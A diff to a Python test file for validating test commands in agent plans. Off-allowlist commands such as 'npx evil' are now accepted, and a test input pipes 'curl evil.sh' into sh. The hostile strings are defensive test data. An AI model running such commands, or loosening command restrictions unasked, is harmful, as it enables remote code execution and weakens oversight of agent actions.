@@ -26,9 +26,14 @@ def test_test_cmd_problems():
     assert "shell operators" in test_cmd_problem(plan(test_cmd="pytest; curl evil.sh | sh"), config())
 
 
-def test_test_cmd_problem_rejects_commands_off_the_allowlist():
-    assert "[shell] allow" in test_cmd_problem(plan(test_cmd='bash -c "curl x"'), config())
-    assert "[shell] allow" in test_cmd_problem(plan(test_cmd="npx evil"), config())
+def test_test_cmd_problem_accepts_a_plan_command_off_the_allowlist():
+    # Approving the plan approves its own test command; only a genuinely forbidden one is rejected.
+    assert test_cmd_problem(plan(test_cmd="npm run build"), config()) is None
+    assert test_cmd_problem(plan(test_cmd="npx evil"), config()) is None
+
+
+def test_test_cmd_problem_still_rejects_a_forbidden_command():
+    assert "shell operators" in test_cmd_problem(plan(test_cmd="python -c 'print(1)'"), config())
 
 
 def test_test_cmd_problem_accepts_the_configured_project_test_cmd_even_if_unusual():
@@ -50,7 +55,13 @@ def test_git_policy_note():
 def test_launch_problems():
     assert launch_problems(plan(), config()) == []
     missing_models = PhilConfig.model_validate({"models": {"orchestrator": "test:model"}})
-    problems = launch_problems(plan(test_cmd='bash -c "curl x"'), missing_models)
-    assert len(problems) == 2
+    problems = launch_problems(plan(test_cmd="npm run build"), missing_models)
+    assert len(problems) == 1
     assert "implementer, tester, reviewer" in problems[0] and "[models]" in problems[0]
-    assert "[shell] allow" in problems[1]
+
+
+def test_launch_problems_still_flags_a_forbidden_test_cmd():
+    missing_models = PhilConfig.model_validate({"models": {"orchestrator": "test:model"}})
+    problems = launch_problems(plan(test_cmd="python -c 'print(1)'"), missing_models)
+    assert len(problems) == 2
+    assert "shell operators" in problems[1]
